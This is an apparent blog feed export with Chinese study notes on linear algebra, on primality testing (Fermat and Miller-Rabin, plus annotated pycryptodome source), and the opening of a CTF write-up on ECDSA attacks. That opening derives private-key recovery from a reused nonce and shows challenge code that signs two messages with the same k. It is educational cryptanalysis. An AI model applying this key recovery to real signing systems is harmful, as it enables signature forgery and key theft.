0\\&gt;~~~~~~\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&amp;~~~~~~\vdots\\&gt;a_&#123;s1&#125;x_1+a_&#123;s2&#125;x_2+...+a_&#123;sn&#125;x_n&amp;=0&gt;\end&#123;cases&#125;&gt;$$&gt;**推论1**：n元齐次线性方程组有非零解的充分必要条件是：它的系数矩阵经过初等行变换化成的阶梯形矩阵中，非零行的数目`r&lt;n`&gt;&gt;**推论2**：n元齐次线性方程组，如果方程组的数目s小于未知量的数目n，那么它一定有非零解。&gt;**高斯-若尔当算法**：&gt;&gt;![image-20250826131015073](高等代数-线性方程组/image-20250826131015073.png)&gt;&gt;# 数域&gt;**定义1**：&gt;&gt;复数集的一个子集K如果满足，那么就称K是一个**数域**，有理数集`Q`，实数集`R`，复数集`C`都是数域：&gt;&gt;1. $0,1\in K$&gt;2. $a,b\in K \Rightarrow a\pm b,ab\in K$，$a,b\in K,b\not=0 \Rightarrow \frac&#123;a&#125;&#123;b&#125;\in K$&gt;&gt;注解1：复数域是最大的数域。在讨论线性方程组有没有解时，都是在一个给定的数域K里讨论，称`数域K上的线性方程组`，即它的系数和常数项都属于K，且它的解（若存在）是K中的数组成的有序数组。&gt;&gt;注解2：讨论矩阵问题时，也是在一个给定的数域K里进行，称`数域K上的矩阵`。&gt;&gt;&gt;&gt;**命题1**：&gt;&gt;任一数域都包含有理数域</code></pre>]]></content>
    
    
    <summary type="html">前言：高等代数</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="高等代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>算法数论-素性检验算法</title>
    <link href="http://iyheart.github.io/2025/08/21/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA-%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C%E7%AE%97%E6%B3%95/"/>
    <id>http://iyheart.github.io/2025/08/21/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA-%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C%E7%AE%97%E6%B3%95/</id>
    <published>2025-08-21T12:23:16.000Z</published>
    <updated>2025-08-22T10:28:51.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些算法概念">一些算法概念</h1><p><code>判定问题</code>：只回答<code>是</code>或者<code>否</code>的问题，也就是算法的返回值只有<code>True</code>或者<code>False</code></p><p><code>随机算法</code>：使用了随机数的算法</p><p><code>判定问题偏是(Yes-biased)Monte-Carlo算法</code>：算法给出<code>是</code>的回答总是正确的，给出<code>否</code>的回答也许不正确。如果对应该为<code>是</code>的输入至多以$\varepsilon$的概率给出<code>否</code>的答案则说该算法具有<strong>错误概率$\varepsilon$</strong></p><p><code>判定问题偏否(No-biased)Monte-Carlo算法</code>：算法给出<code>否</code>的回答总是正确的，给出<code>是</code>的回答也许不正确。如果对应该为<code>否</code>的输入至多以$\varepsilon$的概率给出<code>是</code>的答案则说该算法具有<strong>错误概率$\varepsilon$</strong></p><h1 id="素性检验介绍">素性检验介绍</h1><ul><li><p>在公钥密码学中经常都是要生成一个大素数，而大素数是没办法直接生成的，需要随机生成一个大数，在判断该数是否为素数。</p></li><li><p>由于生成的是一个大数，程序没办法遍历2到该数的平方根发现该数是否有因子，这种方法对大数并不高效，所以就需要设计一个算法判断一个大数是否为素数。判断一个数是否为素数这个行为就是<strong>素性检验</strong></p></li><li><p>具体介绍一下<strong>生成随机素数的一般方法</strong>：</p><ul><li>生成随机整数<code>n</code></li><li>判断<code>n</code>是否为素数，有两种判断方法，即<code>确定性算法</code>、<code>随机算法</code>：<ol><li>确定性算法：以概率1确定n是否为素数，2002年三位印度计算机科学家发现了第一个多项式时间的算法，称为<strong>AKS素性检测</strong>，计算复杂度为$O(log^{12}(n))$</li><li>随机算法：如果n通过某些素数判定准则，则n可能为素数，如果不通过则n肯定为合数。如：<code>Fermat素性检测</code>、<code>Miller-Rabin素性检测</code>、<code>Solovay-Strassen素性检测</code>、<code>Lucas素性检测</code></li></ol></li></ul></li><li><p>这里先对成功概率进行分析：在<code>1~N</code>之间随机选取一个数，其为素数的概率约为$\frac{1}{lnN}$，这个其实就是素数的密度。</p></li><li><p>在RSA加密算法中，大素数<code>p、q</code>选取为<code>512bit</code>的素数，其成功概率为$\frac{1}{ln2^{512}}\approx\frac{1}{355}$，即可以在随机选取的<code>355</code>个数中以高概率找到一个素数的。</p></li></ul><h1 id="fermat素性检验">Fermat素性检验</h1><ul><li><p><code>Fermat</code>素性检验是一个<code>判定问题偏否(No-biased)Monte-Carlo算法</code>，该检验算法是随机算法，目前该素性检验方法已经过时了。</p></li><li><p>应用：PGP（邮件加密软件）使用<code>Fermat</code>素性检测算法，在PGP中，通过测试的数为<code>Carmichael</code>数的概率小于$\frac{1}{10^{50}}$</p></li><li><p><code>Fermat</code>素性检验算法原理其实就是费马小定理：若p是素数，则$a^{p-1}=a~mod(~p)$，或者$a^{p-1}\equiv1~mod(~p)$。</p></li><li><p>算法的具体过程：</p></li><li><p>该算法的代码实现：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Fermat_test</span>():</span><br><span class="line">    </span><br></pre></td></tr></table></figure><ul><li><code>Fermat</code>素性检验存在的缺陷：存在这样的合数<code>n</code>，使得$0&lt;a&lt;n,gcd(a,n)=1,a^{n-1}\equiv1~mod(~n)$，这样的合数称为<code>Carmichael</code>数，如<code>561</code>是一个<code>Carmichael</code>数。</li></ul><h1 id="miller-rabin素性检验">Miller-Rabin素性检验</h1><ul><li><p><code>Miller-Rabin</code>算法对于合数问题是一个<code>偏是的Monte Carlo</code>算法。</p></li><li><p><code>Miller-Rabin</code>素性检验，也被称为强伪素数检验，是对<code>Fermat</code>检测的改进。该算法目前为止很常用。</p></li><li><p><code>Miller-Rabin</code>素性检验的原理：</p><ul><li>当n为素数的时候，对于二次同余方程$x^{2}\equiv 1~(mod~n)\Leftrightarrow x\equiv \pm1~mod(~n)$</li><li>设$n-1=2^{k}m$，其中m是奇数，若$(a,n)=1$，则可以由费马小定理得到：<ul><li>$a^{n-1}=a^{2^{k}m}\equiv1~(mod~n)\Leftrightarrow a^{2^{k-1}m}\equiv \pm1~(mod~n)$</li><li>如果$a^{2^{k-1}m}\equiv1~(mod~n)\Leftrightarrow a^{2^{k-2}m}\equiv \pm1~(mod~n)$</li><li>如果$a^{2^{k-2}m}\equiv1~(mod~n)\Leftrightarrow a^{2^{k-3}m}\equiv \pm1~(mod~n)$</li><li>…</li><li>如果$a^{2m}\equiv1~(mod~n)\Leftrightarrow a^{m}\equiv \pm1~(mod~n)$</li></ul></li><li>这样对于序列$a^{m},a^{2m},…,a^{2^{k-1}m},a^{2^{k}m}~(mod~n)$就会得到这样的一个序列：$(1,1,…,1)$或者$(<em>,</em>,…,*,-1,1,…,1)$。</li><li>对于一个随机数，按照上述方法计算，如果<code>p</code>是素数，就会得到序列$(1,1,…,1)$或者$(<em>,</em>,…,*,-1,1,…,1)$，如果<code>p</code>不是素数，就不会得到该序列</li></ul></li><li><p>算法具体过程：</p><ul><li><p>第一步：先把$n-1$写成$2^km$的形式，其中m是一个奇数</p></li><li><p>第二步：使用随机数生成器，生成一个整数$a\in[1,n-1]$</p></li><li><p>第三步：</p><ul><li>$b\leftarrow a^m~(mod~n)$。这里直接先从$a^{m}$开始检查</li><li>$if~b\equiv 1~(mod~n)$，<code>return &quot;n is prime&quot;</code>。先检查形式是否为<code>(1,1,...,1)</code>。</li></ul></li><li><p>第四步：</p><ul><li><p><code>for i&lt;- 0 to k-1</code></p></li><li><p><code>do</code>：</p><p>$if~b\equiv-1(mod~n)$，<code>return &quot;n is prime&quot;</code>此时判断形式是否为<code>(*,...,*,-1,1,...)</code>）</p><p>$else~b\leftarrow b^2 ~(mod~n)$</p></li><li><p><code>return &quot;n is composite&quot;</code></p></li></ul></li></ul></li><li><p>代码实现如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Miller_Rabin_test</span>():</span><br></pre></td></tr></table></figure><ul><li>错误概率分析：<ul><li>如果黎曼猜想为真，<code>Miller-Rabin</code>素性检验可以转为确定性算法。当目前算法的确定性与否还不知道。</li><li>如果<code>n</code>是奇合数，则在${1,…,n-1}$范围内至多有$\frac{n-1}{4}$个a能让<code>n</code>通过<code>Miller-Rabin</code>检测</li><li>这说明奇合数只有至多$\frac{1}{4}$的概率通过一次<code>Miller-Rabin</code>检测，则奇合数通过<code>k</code>次的<code>Miller-Rabin</code>检测的概率至多为$\frac{1}{4^{k}}$（但是这并不是错误概率）</li><li>错误概率：<code>n</code>通过了素性检测，但<code>n</code>是合数的概率。（该问题是一个条件概率的问题）。先定义两个随机变量也就是，定义<code>a: 一个特定长度的随机奇整数n是合数</code>，定义<code>b: 算法连续回答了m次&quot;n是一个素数&quot;</code>，则求错误概率其实就是求条件概率$P(a\mid b)$，也就是当事件<code>b</code>发生时，事件<code>a</code>发生的概率。<ul><li>可以很容易知道<code>奇整数n为素数的概率</code>：$P(\bar{a})\approx \frac{2}{ln~n}$，因为素数在整数的分布为$\frac{1}{ln~n}$，而在奇整数的概率就翻倍了。这样就可以得到$P(a)\approx 1 - \frac{2}{ln~n}$</li><li>还可以知道<code>在已知n为奇素数条件下,事件b是必然发生</code>即：$P(b\mid \bar{a})= 1$，由条件概率$P(b\mid\bar{a})=\frac{P(\bar{a}b)}{P(\bar{a})}$</li><li>由上面可以知道<code>在已知n为奇合数条件下,算法m次回答&quot;n是一个素数&quot;的概率</code>：$P(b\mid a)≤\frac{1}{4^{m}}$由条件概率可以知道，$P(b\mid a)=\frac{P(ab)}{P(a)}$</li><li>那么由条件概率和全概率的公式就可以得到：$P(a\mid b)=\frac{P(ab)}{P(b)}=\frac{P(b\mid a)P(a)}{P(b\mid a)P(a)+P(b\mid \bar{a})P(\bar{a})}≤\frac{\frac{1}{4^m}<em>(1-\frac{2}{ln~n})}{\frac{1}{4^{m}}</em>(1-\frac{2}{ln~n})+\frac{2}{ln~n}}=\frac{ln~n-2}{ln~n-2+2^{2m+1}}$</li></ul></li><li>从错误概率的推导可以看出，随着检测次数的增加，错误概率是逐渐降低的。</li></ul></li><li>下图给出错误概率的一张表：</li></ul><p><img src="/2025/08/21/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA-%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C%E7%AE%97%E6%B3%95/image-20250822004159274.png" alt="image-20250822004159274"></p><h1 id="solovay-strassen素性检验">Solovay-Strassen素性检验</h1><h1 id="lucas素性检验">Lucas素性检验</h1><h1 id="python-cryptoutilnumber源码">Python-Crypto.Util.number源码</h1><ul><li>对于Python中的<code>Crypto.Util.number</code>应该都不陌生，经常都在用，这里主要分析三个函数的源码，即<code>getPrime</code>、<code>isPrime</code>、<code>_rabinMillerTest</code>这三个函数，其中<code>getPrime</code>中有使用<code>isPrime</code>函数，而<code>isPrime</code>中有使用的就是<code>_rabinMillerTest</code>函数作为素性检测算法</li><li>一般来说都是使用<code>pycharm</code>作为<code>python</code>的开发环境，所以这里就说明一下<code>pycharm</code>中如何找到该源码(没下载的要先下载)，首先打开<code>venv-&gt;Lib-&gt;</code>这个目录</li></ul><p><img src="/2025/08/21/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA-%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C%E7%AE%97%E6%B3%95/image-20250821211916677.png" alt="image-20250821211916677"></p><ul><li>然后找到<code>Crypto</code>这个包，再找到<code>Crypto</code>中<code>Util</code>这个子包</li></ul><p><img src="/2025/08/21/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA-%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C%E7%AE%97%E6%B3%95/image-20250821212050368.png" alt="image-20250821212050368"></p><ul><li>最后找到<code>number.py</code>这个文件即可</li></ul><p><img src="/2025/08/21/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA-%E7%B4%A0%E6%80%A7%E6%A3%80%E9%AA%8C%E7%AE%97%E6%B3%95/image-20250821212141364.png" alt="image-20250821212141364"></p><h2 id="getprime">getPrime</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getPrime</span>(<span class="params">N, randfunc=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;返回一个N位的素数.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    N必须是一个大于1的整数N must be an integer larger than 1.</span></span><br><span class="line"><span class="string">    如果没有提供randfunc,则使用Random.get_random_bytes这个函数.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置随机数生成器</span></span><br><span class="line">    <span class="keyword">if</span> randfunc <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        randfunc = Random.get_random_bytes</span><br><span class="line"><span class="comment"># 检查N是否大于2</span></span><br><span class="line">    <span class="keyword">if</span> N &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;N must be larger than 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 随机生成一个数,并判断该数是否为素数,调用isPrime判断 </span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        number = getRandomNBitInteger(N, randfunc) | <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(number, randfunc=randfunc):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> number</span><br></pre></td></tr></table></figure><h2 id="isprime">isPrime</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">isPrime</span>(<span class="params">N, false_positive_prob=<span class="number">1e-6</span>, randfunc=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">r&quot;&quot;&quot;判断整数N是不是一个素数.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        false_positive_prob (float):</span></span><br><span class="line"><span class="string">          结果不是素数的统计概率,默认值为10^&#123;-6&#125;.</span></span><br><span class="line"><span class="string">          注意，实际出现误判的概率远小于这个值</span></span><br><span class="line"><span class="string">          这里只是数学上可以严格证明.</span></span><br><span class="line"><span class="string">        randfunc (callable):</span></span><br><span class="line"><span class="string">          一个随机数生成函数,它接收参数N,并返回一个长度为N的随机字节串</span></span><br><span class="line"><span class="string">          如果没有提供该函数默认使用的是Crypto.Random.get_random_bytes这个函数,作为随机数生成算法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Return:</span></span><br><span class="line"><span class="string">    如果输入的N是素数,则返回True</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 使用默认的随机数生成算法</span></span><br><span class="line">    <span class="keyword">if</span> randfunc <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        randfunc = Random.get_random_bytes</span><br><span class="line"><span class="comment"># 当_fastmath这个库被调用的时候,就使用_fastmath库中的isPrime进行判断以提高效率</span></span><br><span class="line">    <span class="keyword">if</span> _fastmath <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _fastmath.isPrime(long(N), false_positive_prob, randfunc)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先判断N的是否为特殊的素数2</span></span><br><span class="line">    <span class="keyword">if</span> N &lt; <span class="number">3</span> <span class="keyword">or</span> N &amp; <span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> N == <span class="number">2</span></span><br><span class="line">    <span class="comment"># 再判断p是否被sieve_base中的元素整除,或者是sieve_base中的元素</span></span><br><span class="line">    <span class="comment"># sieve_base存放的元素是2~104729之间所有的素数,包括2和104729</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> sieve_base:</span><br><span class="line">        <span class="keyword">if</span> N == p:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> N % p == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment"># 最后先确定_rabinMillerTest检测的次数rounds,该检测的次数rounds为-ln(false_positive_prob)/ln(4)向上取整</span></span><br><span class="line">    rounds = <span class="built_in">int</span>(math.ceil(-math.log(false_positive_prob)/math.log(<span class="number">4</span>)))</span><br><span class="line">    <span class="comment"># 最后使用_rabinMillerTest进行检测,并且_rabinMillerTest中才是调用randfunc算法的函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(_rabinMillerTest(N, rounds, randfunc))</span><br></pre></td></tr></table></figure><h2 id="_rabinmillertest">_rabinMillerTest</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_rabinMillerTest</span>(<span class="params">n, rounds, randfunc=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;_rabinMillerTest(n:long, rounds:int, randfunc:callable):int</span></span><br><span class="line"><span class="string">    测试n是否为素数</span></span><br><span class="line"><span class="string">    返回值为0:n肯定是合数</span></span><br><span class="line"><span class="string">    返回值为1:n很可能是素数</span></span><br><span class="line"><span class="string">    返回值为2:n肯定是素数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    如果未提供randfunc,则使用Random.new.read</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    这个函数仅供内部使用,未来可能会被重命名或删除</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 检测特殊的情况(n==2, n even, n &lt; 2)</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">3</span> <span class="keyword">or</span> (n &amp; <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> n == <span class="number">2</span></span><br><span class="line">    <span class="comment"># n可能是一个非常大的数,所以先计算n-1应该会更好</span></span><br><span class="line">    n_1 = n - <span class="number">1</span></span><br><span class="line">    <span class="comment"># 这一步就是将n-1转换为2**b * m的形式,b需要最大,m是奇数</span></span><br><span class="line">    b = <span class="number">0</span></span><br><span class="line">    m = n_1</span><br><span class="line">    <span class="keyword">while</span> (m &amp; <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        b += <span class="number">1</span></span><br><span class="line">        m &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    tested = [] <span class="comment"># 存储被测试过的随机数,以免之后随机数再次生成到被测试过的数</span></span><br><span class="line">    <span class="comment"># 做最多n-2次判断</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> iter_range (<span class="built_in">min</span> (rounds, n-<span class="number">2</span>)):</span><br><span class="line">        <span class="comment"># 随机选择一个小于n的数a,确保它之前没有被测试过</span></span><br><span class="line">        a = getRandomRange (<span class="number">2</span>, n, randfunc)</span><br><span class="line">        <span class="keyword">while</span> a <span class="keyword">in</span> tested:</span><br><span class="line">            a = getRandomRange (<span class="number">2</span>, n, randfunc)</span><br><span class="line">        tested.append (a)</span><br><span class="line">        <span class="comment"># 接下来就是进行rabin-miller素性检验</span></span><br><span class="line">        z = <span class="built_in">pow</span> (a, m, n) <span class="comment"># (a**m) % n</span></span><br><span class="line">        <span class="keyword">if</span> z == <span class="number">1</span> <span class="keyword">or</span> z == n_1:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        composite = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> iter_range(b):</span><br><span class="line">            z = (z * z) % n</span><br><span class="line">            <span class="keyword">if</span> z == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> z == n_1:</span><br><span class="line">                composite = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> composite:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：做到一题素性检测的题目，学学素性检测</summary>
    
    
    
    <category term="算法" scheme="http://iyheart.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    <category term="算法数论" scheme="http://iyheart.github.io/categories/%E7%AE%97%E6%B3%95/%E7%AE%97%E6%B3%95%E6%95%B0%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>椭圆曲线数字签名相关攻击</title>
    <link href="http://iyheart.github.io/2025/08/13/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/Elliptic_Curve/ECDSA-Attack/"/>
    <id>http://iyheart.github.io/2025/08/13/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/Elliptic_Curve/ECDSA-Attack/</id>
    <published>2025-08-12T16:37:23.000Z</published>
    <updated>2025-08-12T18:00:19.896Z</updated>
    
    <content type="html"><![CDATA[<ul><li>对于<code>ECDSA</code>的攻击最核心的部分就是随机数<code>k</code>和私钥<code>d</code>，一般都是在这俩个数据做文章，结合近期比赛上遇到的<code>ECDSA</code>相关的密码题目，<strong>更经常的是在随机数<code>k</code>这边做文章</strong>。难度加大一点就是对<code>k、d</code>二者都做点事情。</li><li>对数据签名攻击的最终目的是为了伪造数字签名数据对即<code>(s,r)</code>这俩个数据对，而这两个数据对与<code>k、d</code>是相关的，对于<code>ECDSA</code>攻击的核心点基本上都是在<code>k、d</code>这两点上。</li></ul><h1 id="题型1随机数k的复用">题型1—随机数k的复用</h1><h2 id="题型1推导">题型1推导</h2><ul><li>在<code>ECDSA</code>数字签名的时候， 如果随机数<code>k</code>复用就会导致私钥的泄露，首先回顾一下<code>ECDSA</code>数字签名的过程。主要就是下面这俩个式子</li></ul><p>$$<br>r = x~mod(~n)\<br>s = k^{-1}(h+r*d)~mod(~n)<br>$$</p><ul><li>对于俩次不同的签名，有如下的式子</li></ul><p>$$<br>r_1 = x_1~mod(~n)\<br>s_1 = k_1^{-1}(h_1+r_1<em>d)~mod(~n)\<br>\<br>r_2 = x_2~mod(~n)\<br>s_2 = k_2^{-1}(h_2+r_2</em>d)~mod(~n)\<br>$$</p><ul><li>当随机数k重复使用就会出现$k_1=k_2=k$这一情况，由于$x = (k*G).x()$，这就导致了$r_1=r_2=r$上面的式子就可以写成这样：</li></ul><p>$$<br>r = x~mod(~n)\<br>s_1 = k^{-1}(h_1+r<em>d)~mod(~n)\<br>\<br>r = x~mod(~n)\<br>s_2 = k^{-1}(h_2+r</em>d)~mod(~n)\<br>$$</p><ul><li>所以就有：</li></ul><p>$$<br>s_1-s_2=\frac{h1+r<em>d-h2-r</em>d}{k}~mod(~n)\<br>s_1-s_2=\frac{h1-h2}{k}~mod(n)\<br>\therefore k = (h_1-h_2)<em>(s_1-s_2)^{-1}~mod(~n)\<br>\therefore d = (s_1</em>k-h_1)*r^{-1}~mod(n)<br>$$</p><h2 id="题型1例题">题型1例题</h2><ul><li>接下来给出一个例题：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">p = <span class="number">104013039882501274693449938443150870046676177290878392003647959897761590749237</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">55</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b]) <span class="comment"># 创建一个椭圆曲线</span></span><br><span class="line">O = E.order()                  <span class="comment"># 计算该椭圆曲线的阶</span></span><br><span class="line">G = E.gen(<span class="number">0</span>)                   <span class="comment"># 获取该椭圆曲线的一个生成元</span></span><br><span class="line">d = random.randint(<span class="number">1</span>,O-<span class="number">1</span>)      <span class="comment"># 生成一个私钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">h</span>(<span class="params">message</span>):                <span class="comment"># 计算消息的哈希值</span></span><br><span class="line">    t = sha256(message.encode(<span class="string">&#x27;utf-8&#x27;</span>)).digest()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(t,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ecdsa</span>(<span class="params">k,G,d,h_,O</span>):             <span class="comment"># 进行椭圆曲线数字签名</span></span><br><span class="line">    K = k*G</span><br><span class="line">    x = <span class="built_in">int</span>(K.x())</span><br><span class="line">    r = x % O</span><br><span class="line">    k_ = inverse_mod(k,O)</span><br><span class="line">    s = k_ * (h_ + r * d) % O</span><br><span class="line">    <span class="keyword">return</span> (r,s)</span><br><span class="line">    </span><br><span class="line">message = [<span class="string">&quot;Hello_world&quot;</span>,<span class="string">&quot;this_is_a_meesage&quot;</span>]</span><br><span class="line">h1 = h(message[<span class="number">0</span>])</span><br><span class="line">h2 = h(message[<span class="number">1</span>])</span><br><span class="line">k = random.randint(<span class="number">1</span>,O-<span class="number">1</span>)</span><br><span class="line">sig1 = ecdsa(k,G,d,h1,O)</span><br><span class="line">sig2 = 